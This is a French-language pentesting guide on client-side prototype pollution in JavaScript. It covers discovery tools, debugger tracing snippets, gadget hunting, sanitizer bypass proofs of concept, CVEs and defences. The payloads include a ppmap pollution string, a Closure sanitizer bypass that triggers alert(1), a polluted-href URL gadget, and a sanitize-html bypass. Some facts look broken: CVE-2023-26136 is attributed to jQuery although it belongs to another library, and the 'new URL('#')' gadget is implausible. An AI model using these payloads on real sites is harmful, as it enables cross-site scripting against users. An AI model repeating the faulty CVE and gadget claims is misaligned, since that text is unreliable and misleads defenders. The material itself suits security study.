# Pollution de Prototype Côté Client

{{#include ../../../banners/hacktricks-training.md}}

## Découverte à l'aide d'outils automatiques

Les outils [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **et** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) peuvent être utilisés pour **trouver des vulnérabilités de pollution de prototype**.

De plus, vous pouvez également utiliser l'**extension de navigateur** [**PPScan**](https://github.com/msrkp/PPScan) pour **scanner automatiquement** les **pages** que vous **accédez** à la recherche de vulnérabilités de pollution de prototype.

### Débogage de l'utilisation d'une propriété <a href="#id-5530" id="id-5530"></a>
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype, "potentialGadget", {
__proto__: null,
get() {
console.trace()
return "test"
},
})
```
### Trouver la cause profonde de la pollution de prototype <a href="#id-5530" id="id-5530"></a>

Une fois qu'une vulnérabilité de pollution de prototype a été identifiée par l'un des outils, et si le code n'est pas trop complexe, vous pourriez trouver la vulnérabilité en recherchant des mots-clés tels que `location.hash`, `decodeURIComponent` ou `location.search` dans les outils de développement Chrome. Cette approche vous permet de localiser la section vulnérable du code JavaScript.

Pour des bases de code plus grandes et plus complexes, une méthode simple pour découvrir le code vulnérable implique les étapes suivantes :

1. Utilisez un outil pour identifier une vulnérabilité et obtenir un payload conçu pour définir une propriété dans le constructeur. Un exemple fourni par ppmap pourrait ressembler à : `constructor[prototype][ppmap]=reserved`.
2. Définissez un point d'arrêt à la première ligne de code JavaScript qui s'exécutera sur la page. Actualisez la page avec le payload, en mettant l'exécution en pause à ce point d'arrêt.
3. Pendant que l'exécution JavaScript est en pause, exécutez le script suivant dans la console JS. Ce script signalera quand la propriété 'ppmap' est créée, aidant à localiser son origine :
```javascript
function debugAccess(obj, prop, debugGet = true) {
var origValue = obj[prop]

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet) debugger
return origValue
},
set: function (val) {
debugger
origValue = val
},
})
}

debugAccess(Object.prototype, "ppmap")
```
4. Retournez à l'onglet **Sources** et sélectionnez “Reprendre l'exécution du script”. Le JavaScript continuera à s'exécuter, et la propriété 'ppmap' sera polluée comme prévu. L'utilisation de l'extrait fourni facilite l'identification de l'emplacement exact où la propriété 'ppmap' est polluée. En examinant la **pile d'appels**, différentes piles où la pollution s'est produite peuvent être observées.

Lors de la décision sur quelle pile enquêter, il est souvent utile de cibler les piles associées aux fichiers de bibliothèques JavaScript, car la pollution de prototype se produit fréquemment dans ces bibliothèques. Identifiez la pile pertinente en examinant son attachement aux fichiers de bibliothèque (visible sur le côté droit, similaire à une image fournie pour orientation). Dans les scénarios avec plusieurs piles, comme celles des lignes 4 et 6, le choix logique est la pile de la ligne 4, car elle représente la première occurrence de pollution et donc la cause racine de la vulnérabilité. Cliquer sur la pile vous dirigera vers le code vulnérable.

![https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Trouver des gadgets de script

Le gadget est le **code qui sera abusé une fois qu'une vulnérabilité PP est découverte**.

Si l'application est simple, nous pouvons **chercher** des **mots-clés** comme **`srcdoc/innerHTML/iframe/createElement`** et examiner le code source pour vérifier s'il **mène à l'exécution de javascript**. Parfois, les techniques mentionnées peuvent ne pas trouver de gadgets du tout. Dans ce cas, une simple révision du code source révèle de jolis gadgets comme l'exemple ci-dessous.

### Exemple de recherche de gadget PP dans le code de la bibliothèque Mithil

Vérifiez cette rédaction : [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Recompilation des charges utiles pour les bibliothèques vulnérables

- [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
- [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## Contournement des assainisseurs HTML via PP

[**Cette recherche**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) montre des gadgets PP à utiliser pour **contourner les assainissements** fournis par certaines bibliothèques d'assainisseurs HTML :

- **sanitize-html**

<figure><img src="../../../images/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

- **dompurify**

<figure><img src="../../../images/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

- **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Nouveaux Outils & Automatisation (2023–2025)

* **Burp Suite DOM Invader (v2023.6)** – PortSwigger a ajouté un onglet *Prototype-pollution* dédié qui modifie automatiquement les noms de paramètres (par exemple, `__proto__`, `constructor.prototype`) et détecte les propriétés polluées aux points de sink à l'intérieur de l'extension du navigateur. Lorsque un gadget est déclenché, DOM Invader affiche la pile d'exécution et la ligne exacte où la propriété a été déséréférencée, rendant la recherche manuelle de points d'arrêt inutile. Combinez-le avec le snippet "Break on property access" déjà montré ci-dessus pour pivoter rapidement de *source → sink*.
* **protoStalker** – un plug-in open-source pour Chrome DevTools (publié en 2024) qui visualise les chaînes de prototypes en temps réel et signale les écritures sur des clés globalement dangereuses telles que `onerror`, `innerHTML`, `srcdoc`, `id`, etc. Utile lorsque vous n'avez qu'un bundle de production et ne pouvez pas instrumenter l'étape de construction.
* **ppfuzz 2.0 (2025)** – l'outil prend désormais en charge les modules ES, HTTP/2 et les points de terminaison WebSocket. Le nouveau mode `-A browser` lance une instance de Chromium sans tête et énumère automatiquement les classes de gadgets en bruteforçant les API DOM (voir la section ci-dessous).

---

## Recherche Récente sur les Gadgets de Prototype-Pollution (2022–2025)

Au milieu de 2023, des chercheurs de PortSwigger ont publié un article montrant que les objets *intégrés au navigateur* peuvent être transformés en gadgets XSS fiables une fois pollués. Parce que ces objets sont présents sur **chaque** page, vous pouvez obtenir une exécution même si le code de l'application cible ne touche jamais la propriété polluée.

Exemple de gadget (fonctionne dans tous les navigateurs evergreen ≥ 2023-04) :
```html
<script>
// Source (e.g. https://victim/?__proto__[href]=javascript:alert(document.domain))
// For demo we just pollute manually:
Object.prototype.href = 'javascript:alert(`polluted`)' ;

// Sink – URL() constructor implicitly reads `href`
new URL('#'); // breaks into JS; in Chrome you get an alert, Firefox loads "javascript:" URL
</script>
```
Autres gadgets globaux utiles qui ont été confirmés comme fonctionnant après la pollution (testé en 2024-11) :

| Classe de gadget | Propriété lue | Primitive obtenue |
|------------------|----------------|--------------------|
| `Notification`    | `title`        | `alert()` via clic sur la notification |
| `Worker`         | `name`         | Exécution JS dans un Worker dédié |
| `Image`          | `src`          | XSS traditionnel `onerror` |
| `URLSearchParams`| `toString`     | Redirection ouverte basée sur le DOM |

Voir le document PortSwigger pour la liste complète de 11 gadgets et une discussion sur les échappements de sandbox.

---

## CVEs notables de PP côté client (2023-2025)

* **DOMPurify ≤ 3.0.8 – CVE-2024-45801**  Un attaquant pourrait polluer `Node.prototype.after` avant que le nettoyeur ne soit initialisé, contournant le profil *SAFE_FOR_TEMPLATES* et menant à un XSS stocké. Le fournisseur a corrigé en utilisant des vérifications `Object.hasOwn()` et `Object.create(null)` pour les cartes internes.
* **jQuery 3.6.0-3.6.3 – CVE-2023-26136 / CVE-2023-26140**  `extend()` pourrait être utilisé sur des objets fabriqués provenant de `location.hash`, introduisant des propriétés arbitraires dans `Object.prototype` dans le contexte de navigation.
* **sanitize-html < 2.8.1 (2023-10) pollution de prototype**  Une liste d'attributs malveillants telle que `{"__proto__":{"innerHTML":"<img/src/onerror=alert(1)>"}}` a contourné la liste d'autorisation.

Même si la bibliothèque vulnérable vit **uniquement sur le client**, le XSS résultant est toujours exploitable à distance via des paramètres réfléchis, des gestionnaires postMessage ou des données stockées rendues plus tard.

---

## Mesures défensives modernes

1. **Geler le prototype global tôt** (idéalement comme le premier script) :
```javascript
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(Map.prototype);
```
Soyez conscient que cela pourrait casser les polyfills qui dépendent d'une extension tardive.
2. Utilisez `structuredClone()` au lieu de `JSON.parse(JSON.stringify(obj))` ou de snippets "deepMerge" de la communauté – cela ignore les setters/getters et ne parcourt pas la chaîne de prototype.
3. Lorsque vous avez vraiment besoin de la fonctionnalité de fusion profonde, choisissez **lodash ≥ 4.17.22** ou **deepmerge ≥ 5.3.0** qui ont une sanitation de prototype intégrée.
4. Ajoutez une Content-Security-Policy avec `script-src 'self'` et un nonce strict. Bien que CSP ne bloque pas tous les gadgets (par exemple, la manipulation de `location`), cela bloque la majorité des puits `innerHTML`.

## Références

- [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
- [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
- [https://portswigger.net/research/widespread-prototype-pollution-gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets)
- [https://snyk.io/blog/dompurify-prototype-pollution-bypass-cve-2024-45801/](https://snyk.io/blog/dompurify-prototype-pollution-bypass-cve-2024-45801/)

- [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
- [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

{{#include ../../../banners/hacktricks-training.md}}
